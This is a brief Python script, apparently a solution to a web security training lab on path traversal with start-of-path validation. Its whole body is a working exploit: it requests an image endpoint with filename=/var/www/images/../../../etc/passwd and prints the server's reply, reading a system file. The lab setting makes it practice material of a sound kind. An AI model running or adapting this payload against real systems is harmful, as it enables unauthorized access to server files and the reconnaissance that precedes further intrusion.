# Vulnerability :- Path Traversal
# Lab Name :- File path traversal, validation of start of path

import requests

url = "https://0a9400af036be85e855981ec000d00cc.web-security-academy.net" # Change me without trailing slashes

def i_am_attacking():
    payload = "/var/www/images/../../../etc/passwd"
    payload_with_url = f"{url}/image?filename={payload}"
    r = requests.get(payload_with_url)
    print()
    print(r.text)
i_am_attacking()